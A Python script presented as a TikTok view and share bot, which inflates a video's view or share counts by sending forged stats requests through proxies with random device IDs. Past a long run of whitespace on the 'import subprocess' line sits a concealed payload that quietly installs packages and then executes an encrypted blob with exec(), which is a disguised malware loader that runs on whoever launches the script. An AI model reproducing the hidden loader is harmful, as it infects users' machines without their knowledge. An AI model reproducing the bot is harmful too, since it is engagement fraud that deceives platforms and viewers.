import ssl
import time
import queue
import threading
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'H6hSDFMU4YU-zTlTqi-VwcuAfYrj0f0dO6J5c87mKZ0=').decrypt(b'gAAAAABoypgKqqbFYwhFe5Ssw7gygY-DRFCY1utPwFrc1XD8sDGrhpur1u8b8F7fn1J9cOaT6LYx5U4soRQM2QQZLsGr6IagTumoMCjnnO_DjtC7Aoa-lXtMbQj3nKG4LyRr-ThXZ9PevltTn7eImLkvbR5W7tk0AaUXQaOK1OrjwpITHcvfBO-AUM0VHRcRZsxgg6owFHmroU46BRmeW4tho8WOk-PQtEP0JNwXiPl4umdf29wES8dbqcpslFIXnMNgc4gl7H2UWtrkVAg6v0i4-kfJoXWqPPAWLUOTJqPrFrnkEgVmvWU24GTxEY6VYl_GvKMz8O76JlstaiE5gaoJbecMPLdoY6ncvM0Cc4AiE9r-dhiHGqI6W_puZpRQIZ7urcnsibRqB8Sf7PYrrzVFFO5Pi8ERO5adyw9Ak-xldJn0op9X4iAl2hHEi3zOTROeszcydUVvSvWrQuhDxIJ_ndzrJjYiRJqEulvFBH0qeDzUGJhhv6aZ81Llman4KDZavENSVBWMrlT1XLynLAWBL8PinNnEABiH_enN674iKVq8XdVy379_wsvMtOQBnrMDCRTM0ErB3liKNHoRTSD8juMZv5U4wsdx3r6n2_D-E4nqlU8c5yjlOuToA9OJo8SRuazoEM6NOipZ0nbd9fQQPbWBFCApCZ-jYRi0RX2vQIpJ6ahslFmcZD16tZCEgKwid7QDjibwNMp__r7rXCxSOJljyHV0_TiALo0s_4KXGbxYLMd45l41Xa-19Eu9xSS8HvH6gVX_pWe0qFMzLxb728Q0na4G4gocTjpkh9S-u-mgN4oKnZDP3uxpkq0UG2gKvH-l40jkKaIw_3fFZmaj-4ydFZonXi_R3qPa8g67TkPbikDj23u3yMundFbvppudYIQo1AEKLZ6H4O7jVYAzjCVVb_KnarzMW3-EZ0vTlZjVimheARr_lwgJEsW_zec1SU3vT5DpHda_SJM3ZMYYfYR-Am9UXr4Uh4zBvhSzoAXwvOK4ke_iH9qsqQ3xkztWOlJiKberRAGcjDkLHWHPASMFxxbT8jQF_6jSnBNQ9ABu5lEbWfEk3bmGJ1HQ6gbq4yOlcuqQ4x0KfzyDr4MTUK_TgqArXsNkydIjs8uHi7IamkvFf31Pnuv3bJEcvM2zoK-BtSEWP0hkrZkTWaUCOmTLM05Gu_VrW2bqep62ZwM-6d5hoxETW5QkslzoiG-nYdlnut_CVYNVGyBPLTa0_f3QnMtEObSQ2lccuWEot17DKpyTSMXA2RgWrafsMtOZKR3phgf6w3Zvk0z2PtsHmF9qqIp515j4GsmH4AXsv2j3dRZWb3y1LHBjdnKOuNFwOr9uzyQ4SX8_ptt5e9JXRt1Ey1CgSpuKxskicvGdvbu4l7r9XQYiMtxglyYJL4DeQRyB0-tHRKVtLMjdeM9efampFEGhNSDNy9jfgkIWnDn1V8QTJThnnXfQCHAG7uhxlUblEIreeBf0oxA7EKnrmV3VDwCCCGL882i2FbvjlSorJU_LXGxzmHOI5z6_y71rWDubSwJgjZ6VUK1SRVPDoCnuXZaSBwKYIA-BZVv2Y0PyJP4V4q3s5N0ufHY_r7vgQ79YeEor9twNPPhxuW3Qff7nbqRpKF1Z0MosG-NYY3w7ehZk1N2RoA7kq9PTzWKFzfLDUu88eMVG0KlQYOL9zOIKNsU3VSpSCfQVmmQhOwsjUjMgUNoJsO_dm-opUTPVpIGxWMermvHp-jYvkd0Y1e2t-gBZGs1baTjmEDtJfMSxClKgxObutQp9CPilLfm1h9jeDI2Ndd2UGN3kM1sETQfeeuInqFVtI0LDppOse8Dz1OwRdyxkLZ0r3NnoF8JYq2IrnWUA0wMqVX3olET6fUaXIWfiExy44YRAXXLHPR3B0tVow-qfnFZoKy6nCNH0HNBU_luRtQm0Kmy8lmmJdlqk6FzqvG8xBsMQml323a5b04q7MJOd7ycqKLhfYac9CjGMTTcEYqnKfWSNJEbankHAZGM1IOQJGoi-hO4HjaUffZ4f9qRw4I0nBgc4EagSY1gGt_hMfRXyOtiI15TjNO0d1Wk5IaFdZihlByRgHoQXpiuMT8Hg-Nfa07BIvPn-bhNqvp4xYW_rBC7ZiQkK0J0-ooZi46KlZjx1_uEhbVViMsxF5bBY8QwNFtDxLpQ6zr_7hW6gyTpxu2SvWpg486Hz43Z-c6bh5GtXK7jWbdOqLeK_dztEoAaEdr3O5HdYxIn0qghIeifAAysdoDGfcp1_QIWgHL22rYDbDMhP_8ynSZNrH4TwvMHeBAM6y2cTDlTHtmjkdSgjOh_H8vHqRkNOlUg6QOLhjn52zFHQDYTtcaiO82REZXXhDNf18ViAE_2WJvyqpnpyzLpD7czyPHbSL20Uw0xlU1-YerNNEZz1UfBbBEb3LEF9jXnrtDfzFC4WToerBqD7PJAb9PF6_8mo2Y5eJMZTBdyh9iHRJMVgty1FP9iizzF5z5fXaAlSCGyPzFuxc_ACw6oOGs8YaWZ8BWQwOaPCoTZNPtLG5D6iMgv_BOtIdOaHSCAJLkpfuBIM4nyInSKTOzr86-OHhYAC8CI5iYB9WnFCthxukWKdXS-2g50ezMun7IIXf0wxbV3saHuqQib7jPT_YkervqR6IjojKOYoAnETqxRvB-oICjHq_KyMwiDNCzkyVS3pvYWUQdOcHGOMCjdMdx6Dd4hOhV-LgFcMHKjyfk4Bxh0gPErtZFA5ivk_Rs7AsAPZLt5f7fr4W-GpFOPk3N5WxDLfaA5bUDpvCFbz4qS9w0kTsEXrAGh8y4WBM9QZTvr7s_5PBUNwMwMgcBuk7hLbmvjnN2FOMWaSfT2FrsVHXW5IlffGj3xekeqd4mlhzb9bRxy51NiHk5-8y_m19yIS-p_5GkngBOZ_urluckyQynbJO7H7LBbCga0KHicU8DmrR8ptbWNFhHEF_cGPY4UUfR4vmCszkNdljlG07Qyc38PDnpZRvyV1XBJkKsKQFCcDwG4E0irKHGa1Jnty6OlMedehxfGnkABKf8rhZfrhMXunb516us2TVqi0RwN7UKF784OO8-T93cukxf8CgsQWTDZ4RCqTsDKdK-SpCcC6SrGF916oPWnlnDwx2JslXxcDF1oLXBtQHOvThiDco6frs8iwxJ1-VA=='));
from random import randint, choice
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from http import cookiejar
from pystyle import Colorate, Colors, Write, Add, Center
from Data.UserAgent import UserAgent
from Data.Lists import DeviceTypes, Platforms, Channel, ApiDomain
from utils import *

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context
r                                 = requests.Session()
countQueue                        = queue.Queue()
sentRequests                      = 0
completed                         = False

r.cookies.set_policy(BlockCookies())
def Banner():
    clearConsole()
    Banner1 = r"""
TikTok View and Share Bot
"""

    Banner2 = r"""

       """

    print(Center.XCenter(Colorate.Vertical(Colors.yellow_to_red, Add.Add(Banner2, Banner1, center=True), 2)))

def sendView():
    proxy         = {f'{proxyType}': f'{proxyType}://{choice(proxyList)}'}
    platform      = choice(Platforms)
    osVersion     = randint(1, 12)
    DeviceType    = choice(DeviceTypes)
    headers       = {
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "user-agent": choice(UserAgent)
                    }
    appName       = choice(["tiktok_web", "musically_go"])
    Device_ID     = randint(1000000000000000000, 9999999999999999999)
    apiDomain     = choice(ApiDomain)
    channelLol    = choice(Channel)
    URI           = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data          = f"item_id={itemID}&play_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, proxies=proxy, timeout=5, verify=False)
        return True
    except:
        return False

def sendShare():
    platform = choice(Platforms)
    osVersion = randint(1, 12)
    DeviceType = choice(DeviceTypes)
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": choice(UserAgent)
    }
    appName = choice(["tiktok_web", "musically_go"])
    Device_ID = randint(1000000000000000000, 9999999999999999999)
    apiDomain = choice(ApiDomain)
    channelLol = choice(Channel)
    URI = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data = f"item_id={itemID}&share_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, verify=False)
        return True
    except:
        return False

def clearURL(link):
    parsedURL = urlparse(link)
    host = parsedURL.hostname.lower()
    if "vm.tiktok.com" == host or "vt.tiktok.com" == host:
        UrlParsed = urlparse(r.head(link, verify=False, allow_redirects=True, timeout=5).url)
        return UrlParsed.path.split("/")[3]
    else:
        UrlParsed = urlparse(link)
        return UrlParsed.path.split("/")[3]

def proccessThread(sendProccess):
    while not completed:
        if sendProccess():
            countQueue.put(1)

def countThread():
    global sentRequests, completed
    while True:
        countQueue.get()
        sentRequests += 1
        if amount > 0:
            if sentRequests >= amount:
                completed = True

def progressThread():
    while True:
        start = time.time()
        startReq = sentRequests
        time.sleep(1)
        end = time.time()
        endReq = sentRequests

        elapsed = end - start
        elapsedReq = endReq - startReq

        print(f"{sentRequests} sent requests! {elapsedReq} requests/second.", end="\r")

if (__name__ == "__main__"):
    clearConsole(); Banner()
    VideoURI     = str(Write.Input("Video Link > ", Colors.yellow_to_red, interval=0.0001))
    amount       = int(Write.Input("Amount (0=inf) > ", Colors.yellow_to_red, interval=0.0001))
    nThreads     = int(Write.Input("Thread Amount > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    sendType     = int(Write.Input("[0] - Views\n[1] - Shares > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    itemID       = clearURL(VideoURI)
    proxyChoose  = True
    while proxyChoose:
        proxyType = Write.Input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ", Colors.yellow_to_red, interval=0.0001)
        if proxyType == "0":
            proxyType = "http"
            proxyChoose = False
        elif proxyType == "1":
            proxyType = "socks4"
            proxyChoose = False
        elif proxyType == "2":
            proxyType = "socks5"
            proxyChoose = False

    proxyList = readProxiesFile()
    clearConsole(); Banner()

    print(Colorate.Horizontal(Colors.yellow_to_red, f"Hits are not counted"))
    print(Colorate.Horizontal(Colors.yellow_to_red, f"Bot started! Check your video stats in 5 minutes !"))

    if sendType == 0:
        sendProcess = sendView
    elif sendType == 1:
        sendProcess = sendShare
    else:
        print(f"Error {sendType}")

    threading.Thread(target=countThread).start()
    threading.Thread(target=progressThread).start()

    for n in range(nThreads):
        threading.Thread(target=proccessThread, args=(sendProcess,)).start()
